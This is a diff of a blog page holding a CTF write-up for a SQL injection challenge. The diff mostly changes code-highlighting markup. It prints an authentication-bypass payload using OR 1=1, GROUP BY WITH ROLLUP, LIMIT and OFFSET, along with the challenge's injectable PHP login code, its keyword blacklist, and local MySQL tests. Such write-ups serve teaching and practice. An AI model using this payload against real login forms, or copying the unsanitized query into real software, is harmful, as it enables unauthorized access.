@@ -10,12 +10,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="payload11&amp;#x27; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码123456789101112131415$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;mysql_select_db($db, $con)">
+    <meta name="description" content="payload1&#39; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;  mysql_select_db($db, $con); $sql&#x3D;&quot;SELECT * FROM interest">
 <meta property="og:type" content="article">
 <meta property="og:title" content="实验吧-因吹斯汀的绕过-writeup">
 <meta property="og:url" content="https://0xr1ngs.github.io/2018/07/12/interesting/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="payload11&amp;#x27; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码123456789101112131415$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;mysql_select_db($db, $con)">
+<meta property="og:description" content="payload1&#39; or 1&#x3D;1 group by pwd with rollup limit 1 offset 2 #  后台核心代码$filter &#x3D; &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;  mysql_select_db($db, $con); $sql&#x3D;&quot;SELECT * FROM interest">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2018-07-12T12:10:50.000Z">
 <meta property="article:modified_time" content="2023-07-10T09:16:45.385Z">
@@ -27,13 +27,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688980609158">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688982031674">
     
-    <link rel="stylesheet" href="/css/style.css?v=1688980609158">
+    <link rel="stylesheet" href="/css/style.css?v=1688982031674">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1688980609158">
+            <link rel="stylesheet" href="/custom.css?v=1688982031674">
         
     
 
@@ -42,7 +42,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1688980609158"></script>
+    <script async src="/js/app.js?v=1688982031674"></script>
     
      
 
@@ -56,7 +56,8 @@
   gtag("config", "G-4D4ZJ9G024");
 </script>
 
-<meta name="generator" content="Hexo 6.3.0"></head>
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-one-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 <body class="mdui-drawer-body-left">
     <div id="nexmoe-background">
@@ -286,15 +287,57 @@
     
 </div>
 
-    <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>&#x27; or <span class="number">1</span>=<span class="number">1</span> group by pwd with rollup limit <span class="number">1</span> offset <span class="number">2</span> #</span><br></pre></td></tr></table></figure>
+    <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code>1&#39; or 1=1 group by pwd with rollup limit 1 offset 2 #
+</code></pre>
+<h1 id="后台核心代码"><a href="#后台核心代码" class="headerlink" title="后台核心代码"></a>后台核心代码</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span><span class="token punctuation">;</span>
 
-<h1 id="后台核心代码"><a href="#后台核心代码" class="headerlink" title="后台核心代码"></a>后台核心代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;pwd&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;CTF&#123;XXXXXX&#125;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;亦可赛艇！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;一颗赛艇！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM interest WHERE uname = '{$_POST['uname']}'"</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">print</span> <span class="token string">"CTF{XXXXXX}"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token keyword">print</span> <span class="token string">"亦可赛艇！"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">print</span> <span class="token string">"一颗赛艇！"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag</p>
-<h1 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> admin888 <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user1 <span class="operator">|</span> pass2    <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> pass3    <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> password <span class="keyword">with</span> <span class="keyword">rollup</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> admin <span class="operator">|</span> admin888 <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user1 <span class="operator">|</span> pass2    <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> pass3    <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<h1 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h1><pre class="line-numbers language-SQL"><code class="language-SQL">mysql> select * from demo where password = '' or 1=1;
++-------+----------+------+
+| name  | password | id   |
++-------+----------+------+
+| admin | admin888 |    1 |
+| user1 | pass2    |    2 |
+| user2 | pass3    |    3 |
++-------+----------+------+
+3 rows in set (0.00 sec)
 
+mysql> select * from demo where password = '' or 1=1 group by password with rollup;
++-------+----------+------+
+| name  | password | id   |
++-------+----------+------+
+| admin | admin888 |    1 |
+| user1 | pass2    |    2 |
+| user2 | pass3    |    3 |
+| user2 | NULL     |    3 |
++-------+----------+------+
+4 rows in set (0.00 sec)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>or 1&#x3D;1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> demo <span class="keyword">where</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> password <span class="keyword">with</span> <span class="keyword">rollup</span></span><br><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> name  <span class="operator">|</span> password <span class="operator">|</span> id   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="operator">|</span> user2 <span class="operator">|</span> <span class="keyword">NULL</span>     <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+----------+------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-SQL"><code class="language-SQL">mysql> select * from demo where password = '' or 1=1 group by password with rollup
+limit 1 offset 3;
++-------+----------+------+
+| name  | password | id   |
++-------+----------+------+
+| user2 | NULL     |    3 |
++-------+----------+------+
+1 row in set (0.00 sec)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
     
   </article>
 
@@ -311,7 +354,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1688980609102"></script>
+    <script async src="/js/copy-codeblock.js?v=1688982031614"></script>
   
 
   
